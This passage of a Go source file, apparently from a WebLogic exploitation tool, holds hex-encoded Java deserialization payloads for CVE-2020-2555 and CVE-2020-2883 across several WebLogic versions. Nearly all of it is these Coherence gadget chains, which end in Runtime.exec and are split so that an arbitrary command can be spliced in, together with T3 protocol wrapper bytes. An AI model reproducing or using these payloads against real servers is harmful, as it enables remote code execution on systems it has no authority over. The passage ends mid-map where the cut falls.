package weblogic

import (
	"encoding/hex"
	"fmt"
	"strings"
)

type Payload struct {

	before string
	after  string
}

const (
	V12214 = "12214"
	V12213 = "12213"
	V12212 = "12212"
	V12211 = "12211"
	V12210 = "12210"
	V12130 = "12130"
	V12120 = "12120"

	CVE2020_2883 = "2020_2883"
	CVE2020_2555 = "2020_2555"

	DefaultVersion = V12214
	PrePayload = "086501ffffffffffffffff00000000041000"
	PosPayload = "1000aced0005737200307765626c6f6769632e73656375726974792e61636c2e696e7465726e616c2e41757468656e74696361746564557365725cf8e9684f73eb7b0200074900096c6f63616c506f7274420003716f734a000974696d655374616d704c000b696e6574416464726573737400164c6a6176612f6e65742f496e6574416464726573733b4c000c6c6f63616c4164647265737371007e00014c00046e616d657400124c6a6176612f6c616e672f537472696e673b5b00097369676e61747572657400025b427870ffffffff650000017fe36676c070707400087765626c6f676963757200025b42acf317f8060854e0020000787000000010ab85b7c5e2b76d137941b7818bc7709b1000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c00007870771c01000000000000000100093132372e302e302e3183b5795200000000781000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707711000000000000000001000000000000000078"
)

var cve_2020_2555_payloads = map[string]*Payload{

	V12214:&Payload{
		before: "ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000027372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400044D61696E7400094D61696E2E6A61766174000B6D616B655061796C6F61647371007E000B000000C271007E000D71007E000E7400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00177873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C746572954E4590BE89865F02000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E000178720034636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E416273747261637451756572795265636F7264657246696C746572F3B98201F680EB90020000787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F72435B250B72F63DB502000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F729B1BE18ED70100E50200014900096D5F6E546172676574787000000000757200325B4C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F723BDD8B89AED70273CA0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F721F62F564B951B6140200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F6471007E00057871007E002000000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E0024000000007571007E002700000002707571007E002700000000740006696E766F6B657371007E0024000000007571007E002700000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870",
	},
	V12213:&Payload{
		before: "ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000027372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400044D61696E7400094D61696E2E6A61766174000B6D616B655061796C6F61647371007E000B000000EA71007E000D71007E000E7400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00177873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C746572AB2901B976C4E27102000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E000178720034636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E416273747261637451756572795265636F7264657246696C746572F3B98201F680EB90020000787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F7206EE10433A4CC4B402000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72752289AD4D4601380200014900096D5F6E546172676574787000000000757200325B4C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F723BDD8B89AED70273CA0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F7287973791B26429DD0200035B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00116D5F657874726163746F7243616368656471007E00014C00096D5F734D6574686F6471007E00057871007E002000000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000000707400096765744D6574686F647371007E0024000000007571007E002700000002707571007E00270000000070740006696E766F6B657371007E0024000000007571007E002700000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "70740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870",
	},
	
	V12212:&Payload{
		before: "ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000027372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400044D61696E7400094D61696E2E6A61766174000B6D616B655061796C6F61647371007E000B000000EA71007E000D71007E000E7400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00177873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C746572AB2901B976C4E27102000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E000178720034636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E416273747261637451756572795265636F7264657246696C746572F3B98201F680EB90020000787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F7206EE10433A4CC4B402000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72752289AD4D4601380200014900096D5F6E546172676574787000000000757200325B4C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F723BDD8B89AED70273CA0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F7287973791B26429DD0200035B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00116D5F657874726163746F7243616368656471007E00014C00096D5F734D6574686F6471007E00057871007E002000000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000000707400096765744D6574686F647371007E0024000000007571007E002700000002707571007E00270000000070740006696E766F6B657371007E0024000000007571007E002700000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "70740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870",
	},

	V12211:&Payload{
		before: "ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000027372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400044D61696E7400094D61696E2E6A61766174000B6D616B655061796C6F61647371007E000B000000EA71007E000D71007E000E7400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00177873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C746572AB2901B976C4E27102000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E000178720034636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E416273747261637451756572795265636F7264657246696C746572F3B98201F680EB90020000787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F7206EE10433A4CC4B402000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72752289AD4D4601380200014900096D5F6E546172676574787000000000757200325B4C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F723BDD8B89AED70273CA0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F7287973791B26429DD0200035B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00116D5F657874726163746F7243616368656471007E00014C00096D5F734D6574686F6471007E00057871007E002000000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000000707400096765744D6574686F647371007E0024000000007571007E002700000002707571007E00270000000070740006696E766F6B657371007E0024000000007571007E002700000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "70740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870",
	},

	V12210:&Payload{
		before: "ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000027372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400044D61696E7400094D61696E2E6A61766174000B6D616B655061796C6F61647371007E000B000000EA71007E000D71007E000E7400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00177873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C746572AB2901B976C4E27102000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E000178720034636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E416273747261637451756572795265636F7264657246696C746572F3B98201F680EB90020000787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F7206EE10433A4CC4B402000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72752289AD4D4601380200014900096D5F6E546172676574787000000000757200325B4C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F723BDD8B89AED70273CA0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F72EE7AE995C02FB4A20200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F6471007E00057871007E002000000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E0024000000007571007E002700000002707571007E002700000000740006696E766F6B657371007E0024000000007571007E002700000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870",
	},

	V12130:&Payload{
		before: "ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000027372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400044D61696E7400094D61696E2E6A61766174000B6D616B655061796C6F61647371007E000B000000EA71007E000D71007E000E7400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00177873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C74657299022596D7B4595302000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E0001787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F72889F81B0945D5B7F02000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72658195303E7238210200014900096D5F6E546172676574787000000000757200325B4C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F723BDD8B89AED70273CA0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F72EE7AE995C02FB4A20200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F6471007E00057871007E001F00000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E0023000000007571007E002600000002707571007E002600000000740006696E766F6B657371007E0023000000007571007E002600000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870",
	},

	V12120:&Payload{
		before: "ACED00057372002E6A617661782E6D616E6167656D656E742E42616441747472696275746556616C7565457870457863657074696F6ED4E7DAAB632D46400200014C000376616C7400124C6A6176612F6C616E672F4F626A6563743B787200136A6176612E6C616E672E457863657074696F6ED0FD1F3E1A3B1CC4020000787200136A6176612E6C616E672E5468726F7761626C65D5C635273977B8CB0300044C000563617573657400154C6A6176612F6C616E672F5468726F7761626C653B4C000D64657461696C4D6573736167657400124C6A6176612F6C616E672F537472696E673B5B000A737461636B547261636574001E5B4C6A6176612F6C616E672F537461636B5472616365456C656D656E743B4C001473757070726573736564457863657074696F6E737400104C6A6176612F7574696C2F4C6973743B787071007E0008707572001E5B4C6A6176612E6C616E672E537461636B5472616365456C656D656E743B02462A3C3CFD22390200007870000000027372001B6A6176612E6C616E672E537461636B5472616365456C656D656E746109C59A2636DD8502000449000A6C696E654E756D6265724C000E6465636C6172696E67436C61737371007E00054C000866696C654E616D6571007E00054C000A6D6574686F644E616D6571007E000578700000002E7400044D61696E7400094D61696E2E6A61766174000B6D616B655061796C6F61647371007E000B000000EA71007E000D71007E000E7400046D61696E737200266A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C654C697374FC0F2531B5EC8E100200014C00046C69737471007E00077872002C6A6176612E7574696C2E436F6C6C656374696F6E7324556E6D6F6469666961626C65436F6C6C656374696F6E19420080CB5EF71E0200014C0001637400164C6A6176612F7574696C2F436F6C6C656374696F6E3B7870737200136A6176612E7574696C2E41727261794C6973747881D21D99C7619D03000149000473697A657870000000007704000000007871007E00177873720024636F6D2E74616E676F736F6C2E7574696C2E66696C7465722E4C696D697446696C74657299022596D7B4595302000649000B6D5F635061676553697A654900076D5F6E506167654C000C6D5F636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B4C00086D5F66696C74657274001A4C636F6D2F74616E676F736F6C2F7574696C2F46696C7465723B4C000F6D5F6F416E63686F72426F74746F6D71007E00014C000C6D5F6F416E63686F72546F7071007E0001787000000000000000007372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F72889F81B0945D5B7F02000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72658195303E7238210200014900096D5F6E546172676574787000000000757200325B4C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F723BDD8B89AED70273CA0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F72EE7AE995C02FB4A20200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F6471007E00057871007E001F00000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E0023000000007571007E002600000002707571007E002600000000740006696E766F6B657371007E0023000000007571007E002600000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "740004657865637070767200116A6176612E6C616E672E52756E74696D6500000000000000000000007870",
	},

}

var cve_2020_2883_payloads = map[string]*Payload{

	V12214: &Payload{
		before: "ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B78700000000273720030636F6D2E74616E676F736F6C2E7574696C2E636F6D70617261746F722E457874726163746F72436F6D70617261746F72F9B3BC58CC52CD210200014C000B6D5F657874726163746F727400224C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B78707372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F72435B250B72F63DB502000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F729B1BE18ED70100E50200014900096D5F6E546172676574787000000000757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F721F62F564B951B6140200025B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F647400124C6A6176612F6C616E672F537472696E673B7871007E000900000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647371007E000D000000007571007E001100000002707571007E001100000000740006696E766F6B657371007E000D000000007571007E001100000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
		after:  "74000465786563770400000003767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707400013178",
	},

	V12213: &Payload{
		before: "ACED0005737200176A6176612E7574696C2E5072696F72697479517565756594DA30B4FB3F82B103000249000473697A654C000A636F6D70617261746F727400164C6A6176612F7574696C2F436F6D70617261746F723B78700000000273720030636F6D2E74616E676F736F6C2E7574696C2E636F6D70617261746F722E457874726163746F72436F6D70617261746F72FB4AC83DF1D72EDC0200014C000B6D5F657874726163746F727400224C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B78707372002C636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E436861696E6564457874726163746F7206EE10433A4CC4B402000078720036636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374436F6D706F73697465457874726163746F72086B3D8C05690F440200015B000C6D5F61457874726163746F727400235B4C636F6D2F74616E676F736F6C2F7574696C2F56616C7565457874726163746F723B7872002D636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E4162737472616374457874726163746F72752289AD4D4601380200014900096D5F6E546172676574787000000000757200235B4C636F6D2E74616E676F736F6C2E7574696C2E56616C7565457874726163746F723B2246204735C4A0FE0200007870000000037372002F636F6D2E74616E676F736F6C2E7574696C2E657874726163746F722E5265666C656374696F6E457874726163746F7287973791B26429DD0200035B00096D5F616F506172616D7400135B4C6A6176612F6C616E672F4F626A6563743B4C00116D5F657874726163746F724361636865647400124C6A6176612F6C616E672F4F626A6563743B4C00096D5F734D6574686F647400124C6A6176612F6C616E672F537472696E673B7871007E000900000000757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A99020000787000000000707400096765744D6574686F647371007E000D000000007571007E001200000002707571007E00120000000070740006696E766F6B657371007E000D000000007571007E001200000001757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B4702000078700000",
